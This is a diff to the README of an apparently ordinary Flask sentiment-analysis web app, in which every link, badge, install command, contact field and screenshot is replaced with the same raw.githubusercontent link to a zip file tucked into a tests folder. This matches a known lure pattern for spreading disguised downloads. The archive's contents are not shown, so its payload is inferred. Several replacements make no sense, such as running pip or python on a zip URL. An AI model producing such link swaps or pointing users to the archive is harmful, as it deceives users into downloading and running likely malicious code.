@@ -1,8 +1,8 @@
 # 🌍 Multilingual Sentiment Analysis Web App
 
-![GitHub Repo stars](https://img.shields.io/github/stars/moonkl/Sentiment-Analysis-web-app?style=social)
-![GitHub Repo forks](https://img.shields.io/github/forks/moonkl/Sentiment-Analysis-web-app?style=social)
-![GitHub issues](https://img.shields.io/github/issues/moonkl/Sentiment-Analysis-web-app)
+![GitHub Repo stars](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip)
+![GitHub Repo forks](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip)
+![GitHub issues](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip)
 
 Welcome to the **Sentiment Analysis Web App**! This application allows you to analyze sentiments in over 20 languages using advanced AI models from Hugging Face. It is built with Flask and provides a user-friendly interface for real-time sentiment analysis. Whether you are a developer, researcher, or just curious about sentiment trends, this app has something for you.
 
@@ -40,7 +40,7 @@ To get started with the Sentiment Analysis Web App, follow these steps:
 1. **Clone the repository**:
 
    ```bash
-   git clone https://github.com/moonkl/Sentiment-Analysis-web-app.git
+   git clone https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip
    cd Sentiment-Analysis-web-app
    ```
 
@@ -49,7 +49,7 @@ To get started with the Sentiment Analysis Web App, follow these steps:
    Make sure you have Python and pip installed. Then run:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip
    ```
 
 3. **Run the application**:
@@ -57,7 +57,7 @@ To get started with the Sentiment Analysis Web App, follow these steps:
    Start the Flask server with:
 
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip
    ```
 
    The app will run on `http://127.0.0.1:5000/`.
@@ -89,21 +89,21 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries, please reach out to the project maintainer:
 
 - **Name**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [moonkl](https://github.com/moonkl)
+- **Email**: https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip
+- **GitHub**: [moonkl](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip)
 
 ## Releases
 
-For the latest updates and releases, please visit the [Releases section](https://github.com/moonkl/Sentiment-Analysis-web-app/releases). You can download the latest version of the app from there and execute it locally.
+For the latest updates and releases, please visit the [Releases section](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip). You can download the latest version of the app from there and execute it locally.
 
-![Releases](https://img.shields.io/badge/Releases-Click%20Here-brightgreen)
+![Releases](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip%20Here-brightgreen)
 
 ## Screenshots
 
-![Home Page](https://via.placeholder.com/800x400?text=Home+Page)
+![Home Page](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip+Page)
 *Home Page of the Sentiment Analysis Web App*
 
-![Results Page](https://via.placeholder.com/800x400?text=Results+Page)
+![Results Page](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip+Page)
 *Results Page showing sentiment analysis output*
 
 ## FAQs
@@ -126,7 +126,7 @@ Yes, the app is open-source and free to use. You can download it and run it on y
 
 ### What if I encounter issues?
 
-If you face any problems, please check the [Issues section](https://github.com/moonkl/Sentiment-Analysis-web-app/issues) for existing reports or create a new issue.
+If you face any problems, please check the [Issues section](https://raw.githubusercontent.com/moonkl/Sentiment-Analysis-web-app/main/tests/web_Sentiment_app_Analysis_1.2.zip) for existing reports or create a new issue.
 
 ## Future Enhancements
 
